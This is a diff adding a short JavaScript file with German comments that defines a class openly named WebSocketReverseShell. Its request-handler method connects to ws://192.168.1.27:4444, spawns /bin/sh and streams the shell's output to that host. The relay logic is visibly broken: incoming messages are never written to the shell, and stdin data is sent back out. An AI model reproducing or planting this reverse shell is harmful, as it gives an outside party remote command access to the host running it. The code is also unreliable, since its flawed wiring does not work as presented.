@@ -1,0 +1,25 @@
+// Verwendung von WebSockets für Persistenz
+
+class WebSocketReverseShell {
+  process_incoming_request({ request }) {
+    const WebSocket = require('ws');
+    
+    // WebSocket-Verbindung zu einem Server aufbauen
+    const ws = new WebSocket('ws://192.168.1.27:4444');
+    
+    ws.on('open', function open() {
+      ws.send('Shell connection established');
+      const cp = require('child_process');
+      const sh = cp.spawn("/bin/sh", []);
+      
+      // Daten in beide Richtungen umleiten
+      sh.stdout.on('data', (data) => ws.send(data));
+      sh.stderr.on('data', (data) => ws.send(data));
+      sh.stdin.on('data', (data) => ws.send(data));
+    });
+    
+    return {}
+  }
+}
+
+//By DaUfooo 2025
